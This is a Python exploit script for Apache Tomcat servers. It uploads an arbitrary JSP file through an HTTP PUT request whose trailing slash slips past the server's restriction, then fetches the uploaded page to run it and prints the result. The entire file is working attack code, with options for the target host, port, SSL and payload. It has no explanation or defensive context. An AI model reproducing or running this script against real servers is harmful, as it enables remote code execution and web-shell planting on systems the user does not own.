import requests
import sys
import argparse
import ntpath

def exploit(args):
    host, port = args.host, args.port
    payload = ""
    filename = ""
    if args.file:
        try:
            with open(args.file, "r") as f:
                payload = f.read()
            filename = ntpath.basename(args.file)
        except:
            print("[!] Error opening the file")
            sys.exit()
    else:
        payload = args.payload
        filename = "1.jsp"

    bypass_url = ""
    normal_url = ""
    if args.ssl:
        bypass_url = f"https://{args.host}:{args.port}/{filename}/"
        normal_url = f"https://{args.host}:{args.port}/{filename}"
    else:
        bypass_url = f"http://{args.host}:{args.port}/{filename}/"
        normal_url = f"http://{args.host}:{args.port}/{filename}"

    print("[*] Uploading JSP Payload")
    try:
        r = requests.put(bypass_url, data=payload, verify=False)
        r.raise_for_status()
    except requests.exceptions.HTTPError as e:
        print("[!] Could not send payload")
        raise SystemExit(e)

    print("[*] Payload Uploaded Successfully!")
    print("[*] Access here: {}".format(normal_url))
    r = requests.get(normal_url)
    print("[*] Response:")
    print(r.text)
    

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p","--port", default=8080, help="Port of Tomcat server, default: 8080", required=False, type=int)
    parser.add_argument('--ssl', dest='ssl', action="store_true", help="If server uses ssl", default="")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", help="JSP file to be uploaded", type=str)
    group.add_argument("-c", "--payload", help="JSP payload to inject", type=str)
    parser.add_argument('host', metavar='host', type=str, help='Host name or IP')
    args = parser.parse_args()
    exploit(args)


if __name__ == "__main__":
    main()